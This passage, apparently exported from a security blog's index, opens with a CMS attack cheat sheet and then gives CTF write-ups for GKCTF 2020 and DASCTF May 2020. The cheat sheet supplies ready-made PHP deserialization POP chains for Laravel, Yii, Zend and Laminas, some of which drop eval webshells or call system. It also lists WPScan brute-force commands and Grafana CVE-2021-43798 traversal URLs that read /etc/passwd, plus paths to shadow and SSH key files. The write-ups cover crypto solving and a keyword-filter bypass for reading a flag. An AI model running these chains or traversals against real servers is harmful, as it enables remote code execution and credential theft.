Symfony\\Component\\Mime\\Part&#123; abstract class AbstractPart &#123; private $headers = null; &#125; class SMimePart extends AbstractPart&#123; protected $_headers; public $inhann; function __construct()&#123; $this-&gt;_headers = [&quot;dispatch&quot;=&gt;&quot;system&quot;]; $this-&gt;inhann = new \\Illuminate\\Broadcasting\\PendingBroadcast(); &#125; &#125;&#125;namespace&#123; $a = new \\Symfony\\Component\\Mime\\Part\\SMimePart(); $ser = preg_replace(&quot;/([^\\&#123;]*\\&#123;)(.*)(s:49.*)(\\&#125;)/&quot;,&quot;\\\\1\\\\3\\\\2\\\\4&quot;,serialize($a)); echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));&#125; ​ Yii版本a. 在controllers目录新建TestController.php控制器，打开TestController.php文件输入&lt;?php echo Yii::getVersion(); ?&gt;，访问Yii项目中的test控制器下的index：index.php?r=test b. /vendor/yiisoft/yii2/BaseYii.php 2.0.x &lt;2.0.37 反序列化 a. yii\\db\\BatchQueryResult::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() b. yii\\db\\BatchQueryResult::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\CreateAction::run() c. 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace yii\\rest&#123; class IndexAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &#x27;file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[0]);?&gt;&quot;);exit();&#x27;; &#125; &#125;&#125;namespace yii\\db&#123; use yii\\web\\DbSession; class BatchQueryResult &#123; private $_dataReader; public function __construct()&#123; $this-&gt;_dataReader=new DbSession(); &#125; &#125;&#125;namespace yii\\web&#123; use yii\\rest\\IndexAction; class DbSession &#123; public $writeCallback; public function __construct()&#123; $a=new IndexAction(); $this-&gt;writeCallback=[$a,&#x27;run&#x27;]; &#125; &#125;&#125;namespace&#123; use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult()));&#125; 2.0.38 反序列化 a. Codeception\\Extension\\RunProcess::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() b. Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()-&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() 2.0.42 反序列化 yii 2.0.42 最新反序列化利用全集 a. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpnamespace Codeception\\Extension&#123; use Prophecy\\Prophecy\\ObjectProphecy; class RunProcess&#123; private $processes = []; public function __construct()&#123; $a = new ObjectProphecy(&#x27;1&#x27;); $this-&gt;processes[]=new ObjectProphecy($a); &#125; &#125; echo urlencode(serialize(new RunProcess()));&#125;namespace Prophecy\\Prophecy&#123; use Prophecy\\Doubler\\LazyDouble; class ObjectProphecy&#123; private $lazyDouble; private $revealer; public function __construct($a)&#123; $this-&gt;revealer=$a;//一个调用自己的对象 $this-&gt;lazyDouble=new lazyDouble(); &#125; &#125; &#125;namespace Prophecy\\Doubler&#123; use Prophecy\\Doubler\\Doubler; class LazyDouble&#123; private $doubler; private $class; private $interfaces; private $arguments; private $double=null; public function __construct()&#123; $this-&gt;doubler = new Doubler(); $this-&gt;arguments=array(&#x27;x&#x27;=&gt;&#x27;x&#x27;); $this-&gt;class=new \\ReflectionClass(&#x27;Exception&#x27;); $this-&gt;interfaces[]=new \\ReflectionClass(&#x27;Exception&#x27;); &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default)&#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Prophecy\\Doubler\\Generator\\Node&#123; class ClassNode&#123;&#125;&#125;namespace Prophecy\\Doubler&#123; use Faker\\DefaultGenerator; use Prophecy\\Doubler\\Generator\\ClassCreator; use Prophecy\\Doubler\\Generator\\Node\\ClassNode; class Doubler&#123; private $namer; private $mirror; private $patches; private $creator; public function __construct()&#123; $name=&#x27;x&#x27;; $node=new ClassNode(); $this-&gt;namer=new DefaultGenerator($name); $this-&gt;mirror=new DefaultGenerator($node); $this-&gt;patches=array(new DefaultGenerator(false)); $this-&gt;creator=new ClassCreator(); &#125; &#125;&#125;namespace Prophecy\\Doubler\\Generator&#123; use Faker\\DefaultGenerator; class ClassCreator&#123; private $generator; public function __construct()&#123; $this-&gt;generator=new DefaultGenerator(&#x27;eval($_POST[&quot;cmd&quot;]);&#x27;); &#125; &#125;&#125; b. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace Codeception\\Extension&#123; use Faker\\UniqueGenerator; class RunProcess&#123; private $processes = []; public function __construct()&#123; $this-&gt;processes[]=new UniqueGenerator(); &#125; &#125; echo urlencode(serialize(new RunProcess()));&#125;namespace Faker&#123; use Symfony\\Component\\String\\LazyString; class UniqueGenerator&#123; protected $generator; protected $maxRetries; public function __construct()&#123; $a = new LazyString(); $this-&gt;generator = new DefaultGenerator($a); $this-&gt;maxRetries = 2; &#125; &#125; class DefaultGenerator&#123; protected $default; public function __construct($default = null)&#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Symfony\\Component\\String&#123; class LazyString&#123; private $value; public function __construct()&#123; include(&quot;closure/autoload.php&quot;); $a = function()&#123;phpinfo();&#125;; $a = \\Opis\\Closure\\serialize($a); $b = unserialize($a); $this-&gt;value=$b; &#125; &#125;&#125; ​ Joomla!3.x &lt;3.4.6 反序列化（+1.5.x/2.x） joomla_exp ​ Wordpress扫描器 WPScan扫描站点：wpscan --url http://xxxx 扫描主题：wpscan --url http://xxxx --enumerate t 扫描主题存在漏洞：wpscan --url http://xxxx --enumerate vt 扫描安装插件：wpscan --url http://xxxx --enumerate p 扫描安装插件漏洞：wpscan --url http://xxxx --enumerate vp 枚举用户：wpscan --url http://xxxx --enumerate u 暴力破解： wpscan --url http://xxxx --wordlist 密码字典 --username 用户名或者密码字典 wpscan --url xxxx -P /root/Desktop/top10000.txt -U admin 插件sp-client-document-managerCVE-2021-24347 Getshell 直接上传，后缀名大小写绕过，上传后路径为wp-content/uploads/sp-client-document-manager/[user_id]/[file_name]，admin的userid为1 moodlehttps://github.com/HoangKien1020/Moodle_RCE User MetaCVE-2022-0779 simple-link-directoryCVE-2022-0760 https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210 mail-mastaCVE-2016-10956 本地文件读取 responsive-vector-maps任意文件读，结合 CVE-2024-2961 LFI to RCE ​ ZendZend FrameWork Pop Chain zend framework 1 反序列化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phpclass Zend_Mail&#123;&#125;class Zend_Log&#123; protected $_writers; function __construct() &#123; $this-&gt;_writers = [new Zend_Log_Writer_Mail()]; &#125;&#125;class Zend_Log_Writer_Mail&#123; protected $_eventsToMail; protected $_mail; protected $_layoutEventsToMail; protected $_layout; function __construct() &#123; $this-&gt;_mail = new Zend_Mail(); $this-&gt;_eventsToMail = [1]; $this-&gt;_layoutEventsToMail = &quot;&quot;; $this-&gt;_layout = new Zend_Config_Writer_Yaml(); &#125;&#125;class Zend_CodeGenerator_Php_File&#123; protected $_filename; protected $_body; function __construct() &#123; $this-&gt;_filename = &quot;a.php&quot;; $this-&gt;_body = &#x27;@eval(base64_decode($_POST[1]));&#x27;; &#125;&#125;class Zend_Config&#123; protected $_data; protected $_loadedSection; protected $_extends; function __construct() &#123; $this-&gt;_loadedSection = &quot;Mrkaixin&quot;; $this-&gt;_data = []; $this-&gt;_extends = &quot;Mrkaixin&quot;; &#125;&#125;class Zend_Config_Writer_Yaml&#123; protected $events; protected $_config; protected $_yamlEncoder; function __construct() &#123; $this-&gt;events = &quot;Mrkaixin&quot;; $this-&gt;_config = new Zend_Config(); $this-&gt;_yamlEncoder = [new Zend_CodeGenerator_Php_File(), &#x27;write&#x27;]; &#125;&#125;echo base64_encode(serialize(new Zend_Log())); ​ LaminasZend FrameWork Pop Chain 入口action: http://your-ip/public/index.php/application[/:action] zend framework 4 反序列化+RCE a. 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace Zend\\View\\Renderer;use Zend\\Config\\Config;class PhpRenderer&#123; function __construct() &#123; $this-&gt;__helpers = new Config(); &#125;&#125;namespace Zend\\Config;class Config &#123; protected $data = []; function __construct() &#123; $this-&gt;data = [&#x27;shutdown&#x27;=&gt;&quot;phpinfo&quot;]; &#125;&#125;namespace Zend\\Log;use Zend\\View\\Renderer\\PhpRenderer;class Logger&#123; protected $writers; function __construct() &#123; $this-&gt;writers = [new PhpRenderer()]; &#125;&#125;echo base64_encode(serialize(new Logger())); b. 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace Laminas\\View\\Resolver&#123; class TemplateMapResolver&#123; protected $map = [&quot;setBody&quot;=&gt;&quot;system&quot;]; &#125;&#125;namespace Laminas\\View\\Renderer&#123; class PhpRenderer&#123; private $__helpers; function __construct()&#123; $this-&gt;__helpers = new \\Laminas\\View\\Resolver\\TemplateMapResolver(); &#125; &#125;&#125;namespace Laminas\\Log\\Writer&#123; abstract class AbstractWriter&#123;&#125; class Mail extends AbstractWriter&#123; protected $eventsToMail = [&quot;ls&quot;]; protected $subjectPrependText = null; protected $mail; function __construct()&#123; $this-&gt;mail = new \\Laminas\\View\\Renderer\\PhpRenderer(); &#125; &#125;&#125;namespace Laminas\\Log&#123; class Logger&#123; protected $writers; function __construct()&#123; $this-&gt;writers = [new \\Laminas\\Log\\Writer\\Mail()]; &#125; &#125;&#125;namespace&#123;$a = new \\Laminas\\Log\\Logger();echo base64_encode(serialize($a));&#125; ​ Grafana重要文件12345678910111213141516171819/usr/sbin/grafana-server/etc/init.d/grafana-server/etc/default/grafana-server/etc/grafana/grafana.ini/var/log/grafana/grafana.log/var/lib/grafana/grafana.db/usr/share/grafana/conf/defaults.ini/etc/passwd/etc/shadow/home/grafana/.bash_history/home/grafana/.ssh/id_rsa/root/.bash_history/root/.ssh/id_rsa/usr/local/etc/grafana/grafana.ini/proc/net/fib_trie/proc/net/tcp/proc/self/cmdline 2.6.0 任意文件读取 CVE-2021-43798 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/public/plugins/alertGroups/../../../../../../../../etc/passwd/public/plugins/alertlist/../../../../../../../../etc/passwd/public/plugins/alertmanager/../../../../../../../../etc/passwd/public/plugins/annolist/../../../../../../../../etc/passwd/public/plugins/barchart/../../../../../../../../etc/passwd/public/plugins/bargauge/../../../../../../../../etc/passwd/public/plugins/canvas/../../../../../../../../etc/passwd/public/plugins/cloudwatch/../../../../../../../../etc/passwd/public/plugins/dashboard/../../../../../../../../etc/passwd/public/plugins/dashlist/../../../../../../../../etc/passwd/public/plugins/debug/../../../../../../../../etc/passwd/public/plugins/elasticsearch/../../../../../../../../etc/passwd/public/plugins/gauge/../../../../../../../../etc/passwd/public/plugins/geomap/../../../../../../../../etc/passwd/public/plugins/gettingstarted/../../../../../../../../etc/passwd/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd/public/plugins/grafana/../../../../../../../../etc/passwd/public/plugins/graph/../../../../../../../../etc/passwd/public/plugins/graphite/../../../../../../../../etc/passwd/public/plugins/heatmap/../../../../../../../../etc/passwd/public/plugins/histogram/../../../../../../../../etc/passwd/public/plugins/influxdb/../../../../../../../../etc/passwd/public/plugins/jaeger/../../../../../../../../etc/passwd/public/plugins/live/../../../../../../../../etc/passwd/public/plugins/logs/../../../../../../../../etc/passwd/public/plugins/loki/../../../../../../../../etc/passwd/public/plugins/mixed/../../../../../../../../etc/passwd/public/plugins/mssql/../../../../../../../../etc/passwd/public/plugins/mysql/../../../../../../../../etc/passwd/public/plugins/news/../../../../../../../../etc/passwd/public/plugins/nodeGraph/../../../../../../../../etc/passwd/public/plugins/opentsdb/../../../../../../../../etc/passwd/public/plugins/piechart/../../../../../../../../etc/passwd/public/plugins/pluginlist/../../../../../../../../etc/passwd/public/plugins/postgres/../../../../../../../../etc/passwd/public/plugins/prometheus/../../../../../../../../etc/passwd/public/plugins/stat/../../../../../../../../etc/passwd/public/plugins/state-timeline/../../../../../../../../etc/passwd/public/plugins/status-history/../../../../../../../../etc/passwd/public/plugins/table-old/../../../../../../../../etc/passwd/public/plugins/table/../../../../../../../../etc/passwd/public/plugins/tempo/../../../../../../../../etc/passwd/public/plugins/testdata/../../../../../../../../etc/passwd/public/plugins/text/../../../../../../../../etc/passwd/public/plugins/timeseries/../../../../../../../../etc/passwd/public/plugins/welcome/../../../../../../../../etc/passwd/public/plugins/xychart/../../../../../../../../etc/passwd/public/plugins/zipkin/../../../../../../../../etc/passwd","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"CMS","slug":"CMS","permalink":"https://lazzzaro.github.io/tags/CMS/"}],"author":"Lazzaro"},{"title":"GKCTF 2020","slug":"match-GKCTF-2020","date":"2020-05-24T10:03:26.000Z","updated":"2020-06-26T10:47:04.329Z","comments":true,"path":"2020/05/24/match-GKCTF-2020/","permalink":"https://lazzzaro.github.io/2020/05/24/match-GKCTF-2020/","excerpt":"","text":"CRYPTO小学生的密码学 e(x)=11x+6(mod26) 密文：welcylk （flag为base64形式） 仿射密码，解密公式：$m=11^{-1}(e(x)-6)\\pmod {26}$ 12345678910111213import gmpy2import base64def affline_decode(cipher_text, a, b, m): plain_text = &#x27;&#x27; for i in cipher_text: if i in &#x27;abcdefghijklmnopqrstuvwxyz&#x27;: plain_text += chr(((ord(i)-ord(&#x27;a&#x27;))-b)*gmpy2.invert(a,m) % m + ord(&#x27;a&#x27;)) else: plain_text += i print(plain_text) m = affline_decode(&#x27;welcylk&#x27;, 11, 6, 26)flag = base64.b64encode(m) ​ babycrypto 附件：encode.txt 已知：n，e，enc，p高位（1024-128） RSA中的coppersmith攻击（已知p的高位攻击） Sage脚本求p，q： 12345678910111213141516171819#Sagefrom sage.all import *n = 0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005Lp4 = 0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b#p去0的剩余位e = 65537pbits = 1024kbits = pbits - p4.nbits()print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)#经过以上一些函数处理后，n和p已经被转化为10进制if roots: p = p4+int(roots[0]) print(&quot;n: &quot;+str(n)) print(&quot;p: &quot;+str(p)) print(&quot;q: &quot;+str(n//p)) 再结合enc正常解出明文m即可。 Backdoor p=k*M+(65537**a %M) 已知：RSA正常加密脚本，公钥文件pub.pem，base64加密密文文件flag.enc 公钥文件解析得n，e，密文文件base64解码处理得c 从 $p=kM+(65537^a \\% M)$ 入手，查询了解到此式子为弱素数生成公式 弱素数生成公式参考： https://asecuritysite.com/encryption/copper https://medium.com/asecuritysite-when-bob-met-alice/so-what-was-the-problem-with-the-estonian-id-system-and-tpms-1ef02a9bde7f 强/弱素数定义：https://zh.wikipedia.org/wiki/%E5%BC%BA%E7%B4%A0%E6%95%B0 n的素数因子p是由此公式生成的，生成脚本在参考文章中已知： 1234567891011121314151617181920212223242526from Crypto.Util import numberk=3vals=39a=12M=1primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021, 1031, 1033, 1039, 1049, 1051, 1061, 1063, 1069, 1087, 1091, 1093, 1097, 1103, 1109, 1117, 1123, 1129, 1151, 1153, 1163, 1171, 1181, 1187, 1193, 1201, 1213, 1217, 1223, 1229, 1231, 1237, 1249, 1259, 1277, 1279, 1283, 1289, 1291, 1297, 1301, 1303, 1307, 1319, 1321, 1327, 1361, 1367, 1373, 1381, 1399, 1409, 1423, 1427, 1429, 1433, 1439, 1447, 1451, 1453, 1459, 1471, 1481, 1483, 1487, 1489, 1493, 1499, 1511, 1523, 1531, 1543, 1549, 1553, 1559, 1567, 1571, 1579, 1583, 1597, 1601, 1607, 1609, 1613, 1619, 1621, 1627, 1637, 1657, 1663, 1667, 1669, 1693, 1697, 1699, 1709, 1721, 1723, 1733, 1741, 1747, 1753, 1759, 1777, 1783, 1787, 1789, 1801, 1811, 1823, 1831, 1847, 1861, 1867, 1871, 1873, 1877, 1879, 1889, 1901, 1907, 1913, 1931, 1933, 1949, 1951, 1973, 1979, 1987, 1993, 1997, 1999, 2003, 2011, 2017, 2027, 2029, 2039, 2053, 2063, 2069, 2081, 2083, 2087, 2089, 2099, 2111, 2113, 2129, 2131, 2137, 2141, 2143, 2153, 2161, 2179, 2203, 2207, 2213, 2221, 2237, 2239, 2243, 2251, 2267, 2269, 2273, 2281, 2287, 2293, 2297, 2309, 2311, 2333, 2339, 2341, 2347, 2351, 2357, 2371, 2377, 2381, 2383, 2389, 2393, 2399, 2411, 2417, 2423, 2437, 2441, 2447, 2459, 2467, 2473, 2477, 2503, 2521, 2531, 2539, 2543, 2549, 2551, 2557, 2579, 2591, 2593, 2609, 2617, 2621, 2633, 2647, 2657, 2659, 2663, 2671, 2677, 2683, 2687, 2689, 2693, 2699, 2707, 2711, 2713, 2719, 2729, 2731, 2741, 2749, 2753, 2767, 2777, 2789, 2791, 2797, 2801, 2803, 2819, 2833, 2837, 2843, 2851, 2857, 2861, 2879, 2887, 2897, 2903, 2909, 2917, 2927, 2939, 2953, 2957, 2963, 2969, 2971, 2999]for x in range(0, vals): M=M*primes[x]p=k*M+(65537**a %M)print(&#x27;k=&#x27;,k)print(&#x27;a=&#x27;,a)print(&#x27;Number of prime numbers used=&#x27;,vals)print(&#x27;======&#x27;)print(&#x27;M=&#x27;,M)print(&#x27;\\nPrime=&#x27;,p)isp = number.isPrime(p)if (isp==1): print(&#x27;Value is prime&#x27;)else: print(&#x27;Value is not prime&#x27;) $M$ 代表前 $x$ 项素数的乘积， $x$ 的可选值有5，16，39，71，80，126。在参数 $k$ 与 $a$ 取值不大的情况下，选取不同的 $x$ 值，得到的 $p$ 的位数不同。 根据已知的n为134位，预估p的位数不超过134/2=67位，可确定 $x$ 值取39，即 $M=962947420735983927056946215901134429196419130606213075415963491270$ 参考得到的 $p$ 符合位数要求。 要得到正确的p值，尝试爆破 $k$ 与 $a$ ： 1234567891011121314151617import gmpy2M=962947420735983927056946215901134429196419130606213075415963491270n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739for k in range(100): for a in range(100): p=k*M+(65537**a %M) if n%p==0: print(&#x27;k=&#x27;,k) print(&#x27;a=&#x27;,a) print(&#x27;\\nPrime=&#x27;,p) isp = gmpy2.is_prime(p) if isp: print(&#x27;Value is prime&#x27;) else: print(&#x27;Value is not prime&#x27;) print(&#x27;======&#x27;) 结果： 易知两个结果分别为正确的p，q值~ 再结合密文c正常解出明文m即可。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"DASCTF May × BJDCTF 3rd 安恒五月赛","slug":"match-DASCTF-May-×-BJDCTF-3rd-安恒五月赛","date":"2020-05-23T17:13:24.000Z","updated":"2020-06-07T17:45:03.702Z","comments":true,"path":"2020/05/24/match-DASCTF-May-×-BJDCTF-3rd-安恒五月赛/","permalink":"https://lazzzaro.github.io/2020/05/24/match-DASCTF-May-%C3%97-BJDCTF-3rd-%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9B/","excerpt":"","text":"MISCQuestionaire 叮~ 您有一份调查问卷~ 请查收~ https://forms.gle/Vmzt99LazrtXsRLM9 谷歌问卷调查，FQ打开，北京知识，每回答对一个空得flag片段。 直接F12看源码大法，有答案，有结果，拼接得flag。 /bin/cat 2 [CAUTION] cats as numerous as stars are coming… 解出的答案经md5后提交~ 远看可现一张二维码，没用脚本，直接stegesolve.jar，取Red plane得明显的黑白图片，上扫码工具得flag。 testyournc Test your nc hint1: /f1a9.bak 你看到了嘛? hint2: 用df命令看看硬盘总共多大，再看看flag多大。 nc交互题。 ls发现目录下有flag和readme，cat flag发现打开卡死，ls -al查看发现flag文件很大（15T+）。 在根目录找到可读文件f1a9.bak，是生成flag文件的源码： 发现是每个字符都随机偏移 $1024\\times1024\\times1024\\times k\\quad (\\rm offset\\mit \\leq k\\leq \\rm offset+2048 )$ 后写入，$\\rm offset$ 本身也在不断递增，中间填满空字符，无法按固定位置读取。 试过很多shell命令的结合，cat,tr,sed,grep,hexdump都各种花样卡死… 受大佬提示此类文件是稀疏文件，非空数据块存入磁盘，空数据库不占用磁盘空间。 尝试将文件移到本地处理，使用tar命令将flag文件打包到某个可写位置，比如/var/tmp，注意到tar有个参数可高效处理稀疏文件： -S或—sparse 倘若一个文件内含大量的连续0字节，则将此文件存成稀疏文件。 上命令：tar -zcvfS /var/tmp/flag.tar.gz flag 这时查看flag.tar.gz文件大小就很小了（0.3KB+） 在nc环境运行 cat flag.tar.gz | base64 再在本地运行 echo -n &quot;H4sIAAAAAAAAA+3RTUrDQBgG4AgK/oBnqDfImCbpUty78gRptQURAlpXIvQIXkDEK3gBPZJHMK2iRasbGWfzPBBm5pu/N8n4vJlkkeWdqp8v2s68DXX5Pg7zJ2ShqKpQ1aHO6yzf75YXWe84drC5q8tpc9HrZRdtO/1t3Wg6jhMg//TeD4t++KE+W+xae5h97F2urz8dfKmvvU3sHnXt1rfb3yY37rKVp20+rr5l+/B5ZX3ncvU5i8s/37T738uhlr8A/+vl/naWOgMAAAAQ1/i8mVynDgEAAABEVVb9qqiLInUOAAAAIJ5BHU5TZwAAAADi6udFkzoDAAAAENegnzoBAAAAENvJMHUCAAAAILaiLJrRKB8My3L/JnUYAAAAIIpJ2570ztrhXuogAAAAAAAAwJ+9AsKEhXoAoAAA&quot; | base64 -d 把得到的base64字符串存储到本地。 本地解压出原始flag文件（15T+）： tar -zxvfS flag.tar.gz 再使用 tar -cvfS flag-new flag 得到稀疏处理过的flag稀疏文件。 PS：写到最后发现，不用在本地处理，直接 tar -cvfS /var/tmp/flag.tar.gz flag 应该也成。 CRYPTObbcrypto its so simple 给定脚本： 12345678910111213141516171819202122232425# -*- coding:utf-8 -*-import A,SALTfrom itertools import *def encrypt(m, a, si): c=&quot;&quot; for i in range(len(m)): c+=hex(((ord(m[i])) * a + ord(next(si))) % 128)[2:].zfill(2) return c if __name__ == &quot;__main__&quot;: m = &#x27;flag&#123;********************************&#125;&#x27; a = A salt = SALT assert(len(salt)==3) assert(salt.isalpha()) si = cycle(salt.lower()) print(&quot;明文内容为：&quot;) print(m) print(&quot;加密后的密文为：&quot;) c=encrypt(m, a, si) print(c)#加密后的密文为：#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d salt长度为3，又知明文m的前5位和后1位字符，有对应关系： (&#39;f&#39;*a+salt[0])%128 = 0x17 (&#39;l&#39;*a+salt[1])%128 = 0x74 (&#39;a&#39;*a+salt[2])%128 = 0x01 (&#39;g&#39;*a+salt[0])%128 = 0x50 (&#39;&#123;&#39;*a+salt[1])%128 = 0x4b (&#39;&#125;&#39;*a+salt[1])%128 = 0x3d 可用脚本爆破： 12345678910111213141516import stringlower = string.printable[10:36]for a in range(1001): for s0 in lower: if hex((102*a+ord(s0)) % 128) == &#x27;0x17&#x27; and hex((103*a+ord(s0)) % 128) == &#x27;0x50&#x27;: print(a, s0)for a in range(1001): for s1 in lower: if hex((108*a+ord(s1)) % 128) == &#x27;0x74&#x27; and hex((123*a+ord(s1)) % 128) == &#x27;0x4b&#x27; and hex((125*a+ord(s1)) % 128) == &#x27;0x3d&#x27;: print(a, s1)for a in range(1001): for s2 in lower: if hex((97*a+ord(s2)) % 128) == &#x27;0x1&#x27;: print(a, s2) 容易得到符合条件的最小a=57及对应salt=&#39;ahh&#39; 在用脚本逆向求出flag{}中间字符： 1234567891011121314151617a = 57si0 = 97si1 = 104si2 = 104c = [0x17, 0x74, 0x01, 0x50, 0x4b, 0x01, 0x25, 0x27, 0x2c, 0x12, 0x27, 0x43, 0x17, 0x1e, 0x2c, 0x25, 0x0a, 0x60, 0x2e, 0x3a, 0x7c, 0x20, 0x6e, 0x01, 0x4a, 0x01, 0x27, 0x03, 0x27, 0x3a, 0x3c, 0x01, 0x60, 0x17, 0x3a, 0x73, 0x75, 0x3d]flag=&#x27;&#x27;for i in range(len(c)): if i%3 ==0: for m in range(0,127): if (m*57+si0)%128 == c[i]: flag+=chr(m) else: for m in range(0,127): if (m*57+si1)%128 == c[i]: flag+=chr(m)print(flag) 得到flag~ easyLCG easy LCG 线性同余生成器（LCG） 线性同余生成器是个产生伪随机数的方法，它是根据递归公式： $N_{j+1}=(A\\times N_j+B)\\pmod M$ 其中$A,B,M$是生成器设定的常数，$A$为乘数，$B$为增量，$M$为模数。 已知初始$seed_0$在生成器运行一次得到： $seed_1=(a\\times seed_0+b) \\% m$ $state_1=seed_1\\gt\\gt16$，即 $seed_1=(state_1\\lt\\lt16)+k_1$ 同样： $seed_2=(a\\times seed_1+b) \\% m$ $state_2=seed_2\\gt\\gt16$，即 $seed_2=(state_2\\lt\\lt16)+k_2$ 联立有： $state_2=(a \\times ((state_1 \\lt\\lt 16)+ k_1 ) + b) \\% m \\gt\\gt16 $ 已知 $a$，$b$，$m$，$state_1$，$state_2$，可以爆破得$k_1$： 123456789101112a = 3844066521b = 3316005024m = 2249804527state1 = 16269state2 = 4249for k in range(2**32): seed1 = (state1&lt;&lt;16)+k res = ((a*seed1+b)%m)&gt;&gt;16 if res==state2: print(seed1) break 而后续的gen_AB()是在以上面迭代两次后的$seed_2$为初始seed的，根据得到的$seed_1$计算$seed_2=278490266$，带入后续步骤即可。 123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.number import *a = 3844066521b = 3316005024m = 2249804527state1 = 16269state2 = 4249class LCG: def __init__(self): self.a = 3844066521 self.b = 3316005024 self.m = 2249804527 self.seed = 278490266 def next(self): self.seed = (self.a*self.seed+self.b) % self.m return self.seed &gt;&gt; 16class DH: def __init__(self): self.lcg = LCG() self.g = 183096451267674849541594370111199688704 self.m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self.A, self.a = self.gen_AB() self.B, self.b = self.gen_AB() self.key = pow(self.A, self.b, self.m) def gen_AB(self): x = &#x27;&#x27; for _ in range(64): x += &#x27;1&#x27; if self.lcg.next() % 2 else &#x27;0&#x27; return pow(self.g, int(x, 2), self.m), int(x, 2)Cipher = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703DH = DH()print(&quot;flag = &#123;&#125;&quot;.format(long_to_bytes(Cipher ^ DH.key))) PWNTaQiniOj-0nc交互题。 用C语言写语句，读取flag.txt的内容。 测试发现禁用了关键字home|ctf|flag，直接字符串分割绕过： 12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt;void main() &#123; FILE *fp; char str[100]; char path[50] =&quot;/ho&quot;; char path2[50]=&quot;me/ct&quot;; char path3[50]=&quot;f/fl&quot;; char path4[50]=&quot;ag&quot;; strcat(path3,path4); strcat(path2,path3); strcat(path,path2); fp = fopen(path, &quot;r&quot;); fgets(str,100,fp); 